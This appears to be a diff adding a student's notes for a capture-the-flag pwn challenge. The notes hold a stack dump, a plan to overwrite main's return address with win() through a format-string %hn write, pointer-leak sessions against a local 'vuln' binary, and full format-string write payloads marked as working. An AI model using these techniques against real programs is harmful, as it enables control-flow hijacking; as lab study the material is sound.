@@ -1,0 +1,102 @@
+Concept to circumvent ASLR issue (am Beispiel von non ASLR Stack):
+
+0x7fffffffdc60:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc80:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc90:	0x0000000000000000	0x0000000000000000
+0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcc0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcd0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdce0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd00:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd30:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd50:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd60:	0x0000000000000001	0x00007ffff7de218a
+0x7fffffffdd70:	0x00007fffffffde60	0x00000000004010a0
+0x7fffffffdd80:	0x0000000100400040	0x00007fffffffde78
+0x7fffffffdd90:	0x00007fffffffde78	0x91b09619faff25af
+0x7fffffffdda0:	0x0000000000000000	0x00007fffffffde88
+0x7fffffffddb0:	0x0000000000000000	0x00007ffff7ffd020
+0x7fffffffddc0:	0x6e4f69e6401d25af	0x6e4f79a5b87925af
+0x7fffffffddd0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdde0:	0x0000000000000000	0x0000000000000000
+0x7fffffffddf0:	0x00007fffffffde78	0x4f6a9ce289ab2900
+0x7fffffffde00:	0x000000000000000d	0x00007ffff7de2245
+0x7fffffffde10:	0x00000000004010a0	0x00007fff00000000
+0x7fffffffde20:	0x0000000000000000	0x0000000000000000
+0x7fffffffde30:	0x0000000000000000	0x00000000004011a0
+0x7fffffffde40:	0x00007fffffffde70	0x0000000000000000
+0x7fffffffde50:	0x0000000000000000	0x00000000004011ca
+0x7fffffffde60:	0x00007fffffffde68	0x0000000000000038
+0x7fffffffde70:	0x0000000000000001	0x00007fffffffe1a8
+0x7fffffffde80:	0x0000000000000000	0x00007fffffffe215
+0x7fffffffde90:	0x00007fffffffe277	0x00007fffffffe29c
+0x7fffffffdea0:	0x00007fffffffe2ae	0x00007fffffffe2db
+0x7fffffffdeb0:	0x00007fffffffe300	0x00007fffffffe329
+0x7fffffffdec0:	0x00007fffffffe339	0x00007fffffffe34c
+0x7fffffffded0:	0x00007fffffffe378	0x00007fffffffe3b6
+0x7fffffffdee0:	0x00007fffffffe3ca	0x00007fffffffe418
+
+0x7fffffffdd70 --> 0x00007fffffffde60 --> 0x00007fffffffde68
+Use %hn and address at ...ffdd70 to write 2 bytes to address at ...ffde60
+and thus override lower two bytes of ...ffde68 with dd68 (or random value) to (hopefully) make it point to return address of main
+then override this address with address of win()
+
+ ~  nc localhost 13711                                                  4766ms  Mi 10 Mai 2023 00:14:31
+Hi, what's your name?
+%38$p %39$p %40$p %68$p %69$p                                            
+Pwn harder, 0x4012c0 0x7f8c0f744d0a 0x7fffb15354b8 0x1 0x7fffb1535fc6
+
+ ~  nc localhost 13711                                                    3.4m  Mi 10 Mai 2023 00:17:59
+Hi, what's your name?
+%38$p %39$p %40$p %65$p %66$p %67$p
+Pwn harder, 0x4012c0 0x7f7de0804d0a 0x7ffcf86e61c8 0x4011ca 0x7ffcf86e61b8 0x1c
+
+
+=> SELECT 13 bit number num
+num = num << 3
+format_string = "%" + str(num) + "." + str(num) "s" + (40-2) * "%0s" + "%hn%" + str(0x401290 - len(str(num))) + ".s" + (29-2) * "%0s" + "%n\n"
+
+
+z.B.: %4096.4096s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%hn%4199052.4199052s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%n
+
+Modified for testing... :
+z.B.: %4096.4096s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%p%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%0s%p
+
+
+
+REMOTE:
+ ~/D/A/S/T/I/S/B/git-repo   *$…  challenges/pwn11/materials  nc localhost 13711    47.8s  Mi 10 Mai 2023 01:11:39
+Hi, what's your name?
+%38$p %39$p %40$p %67$p %68$p %69$p  %70$p %71$p %72$p %73$p
+Pwn harder, 0x4012c0 0x7fd3e47ecd0a 0x7ffdf4e4c608 0x1c 0x1 0x7ffdf4e4cfc6  (nil) 0x7ffdf4e4cfd7 (nil) 0x21
+
+LOCAL:
+ ~/D/A/S/T/I/S/B/git-repo   *$…  challenges/pwn11/materials  ./vuln               1259ms  Mi 10 Mai 2023 01:12:27
+Hi, what's your name?
+%38$p %39$p %40$p %67$p %68$p %69$p  %70$p %71$p %72$p %73$p
+Pwn harder, 0x1 0x7fc2a65d318a 0x7fff0086a5f0 (nil) (nil) 0x4011ca  0x7fff0086a5f8 0x38 0x1 0x7fff0086b27f⏎    
+
+
+=> LOCAL: use %40$p and %73$p
+=> REMOTE: use %40$p and %69$p
+
+
+DO NOT USE $!! use %0s.
+try...
+
+
+promising string: %8x%8x%8x%8x%8x%8x%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8x%lln%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%p
+
+
+%1.1s%8x%8x%8x%8x%8x%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8x%8x%hn%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%4198752.4198752s%8x%8x%n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+%1.1s%8x%8x%8x%8x%8x%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8x%8x%hn%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%4198752.4198752s%8x%8x%n-----------------------------------------------------------ENDE!
+
+ ==> Works in principle. Just renew sizes.
+
